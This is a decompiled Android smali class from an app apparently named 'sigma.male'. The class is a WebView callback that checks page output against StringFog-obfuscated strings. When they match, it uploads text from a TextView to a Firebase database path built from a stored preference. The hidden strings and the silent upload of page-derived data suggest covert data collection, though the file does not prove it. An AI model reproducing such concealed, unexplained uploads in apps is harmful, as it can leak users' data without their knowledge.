.class Lsigma/male/MainActivity$1$1;
.super Ljava/lang/Object;
.source "MainActivity.java"

# interfaces
.implements Landroid/webkit/ValueCallback;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lsigma/male/MainActivity$1;->onPageFinished(Landroid/webkit/WebView;Ljava/lang/String;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation

.annotation system Ldalvik/annotation/Signature;
    value = {
        "Ljava/lang/Object;",
        "Landroid/webkit/ValueCallback",
        "<",
        "Ljava/lang/String;",
        ">;"
    }
.end annotation


# instance fields
.field final synthetic this$1:Lsigma/male/MainActivity$1;


# direct methods
.method constructor <init>(Lsigma/male/MainActivity$1;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Lsigma/male/MainActivity$1$1;->this$1:Lsigma/male/MainActivity$1;

    .line 207
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public bridge synthetic onReceiveValue(Ljava/lang/Object;)V
    .locals 0

    .prologue
    .line 1
    check-cast p1, Ljava/lang/String;

    invoke-virtual {p0, p1}, Lsigma/male/MainActivity$1$1;->onReceiveValue(Ljava/lang/String;)V

    return-void
.end method

.method public onReceiveValue(Ljava/lang/String;)V
    .locals 5

    .prologue
    .line 213
    const-string v0, "BjUwSBgsOzNfGDk7IURWdT0oS1cnOSdZUTo6eQ=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_0

    const-string v0, "Njs0SGslJi9ZXR4xP0VXOTE="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 214
    iget-object v0, p0, Lsigma/male/MainActivity$1$1;->this$1:Lsigma/male/MainActivity$1;

    invoke-static {v0}, Lsigma/male/MainActivity$1;->access$0(Lsigma/male/MainActivity$1;)Lsigma/male/MainActivity;

    move-result-object v0

    invoke-static {v0}, Lsigma/male/MainActivity;->access$3(Lsigma/male/MainActivity;)Ljava/util/HashMap;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/HashMap;->clear()V

    .line 215
    iget-object v0, p0, Lsigma/male/MainActivity$1$1;->this$1:Lsigma/male/MainActivity$1;

    invoke-static {v0}, Lsigma/male/MainActivity$1;->access$0(Lsigma/male/MainActivity$1;)Lsigma/male/MainActivity;

    move-result-object v0

    new-instance v1, Ljava/util/HashMap;

    invoke-direct {v1}, Ljava/util/HashMap;-><init>()V

    invoke-static {v0, v1}, Lsigma/male/MainActivity;->access$4(Lsigma/male/MainActivity;Ljava/util/HashMap;)V

    .line 216
    iget-object v0, p0, Lsigma/male/MainActivity$1$1;->this$1:Lsigma/male/MainActivity$1;

    invoke-static {v0}, Lsigma/male/MainActivity$1;->access$0(Lsigma/male/MainActivity$1;)Lsigma/male/MainActivity;

    move-result-object v0

    invoke-static {v0}, Lsigma/male/MainActivity;->access$3(Lsigma/male/MainActivity;)Ljava/util/HashMap;

    move-result-object v0

    const-string v1, "MTUyTA=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    iget-object v2, p0, Lsigma/male/MainActivity$1$1;->this$1:Lsigma/male/MainActivity$1;

    invoke-static {v2}, Lsigma/male/MainActivity$1;->access$0(Lsigma/male/MainActivity$1;)Lsigma/male/MainActivity;

    move-result-object v2

    invoke-static {v2}, Lsigma/male/MainActivity;->access$0(Lsigma/male/MainActivity;)Landroid/widget/TextView;

    move-result-object v2

    invoke-virtual {v2}, Landroid/widget/TextView;->getText()Ljava/lang/CharSequence;

    move-result-object v2

    invoke-interface {v2}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 217
    iget-object v0, p0, Lsigma/male/MainActivity$1$1;->this$1:Lsigma/male/MainActivity$1;

    invoke-static {v0}, Lsigma/male/MainActivity$1;->access$0(Lsigma/male/MainActivity$1;)Lsigma/male/MainActivity;

    move-result-object v0

    invoke-static {v0}, Lsigma/male/MainActivity;->access$5(Lsigma/male/MainActivity;)Lcom/google/firebase/database/FirebaseDatabase;

    move-result-object v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "JTAnWVk="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v2, p0, Lsigma/male/MainActivity$1$1;->this$1:Lsigma/male/MainActivity$1;

    invoke-static {v2}, Lsigma/male/MainActivity$1;->access$0(Lsigma/male/MainActivity$1;)Lsigma/male/MainActivity;

    move-result-object v2

    invoke-static {v2}, Lsigma/male/MainActivity;->access$6(Lsigma/male/MainActivity;)Landroid/content/SharedPreferences;

    move-result-object v2

    const-string v3, "JTUoSFQ="

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, ""

    invoke-interface {v2, v3, v4}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/google/firebase/database/FirebaseDatabase;->getReference(Ljava/lang/String;)Lcom/google/firebase/database/DatabaseReference;

    move-result-object v0

    .line 218
    invoke-virtual {v0}, Lcom/google/firebase/database/DatabaseReference;->push()Lcom/google/firebase/database/DatabaseReference;

    move-result-object v0

    iget-object v1, p0, Lsigma/male/MainActivity$1$1;->this$1:Lsigma/male/MainActivity$1;

    invoke-static {v1}, Lsigma/male/MainActivity$1;->access$0(Lsigma/male/MainActivity$1;)Lsigma/male/MainActivity;

    move-result-object v1

    invoke-static {v1}, Lsigma/male/MainActivity;->access$3(Lsigma/male/MainActivity;)Ljava/util/HashMap;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/google/firebase/database/DatabaseReference;->updateChildren(Ljava/util/Map;)Lcom/google/android/gms/tasks/Task;

    .line 220
    :cond_0
    return-void
.end method
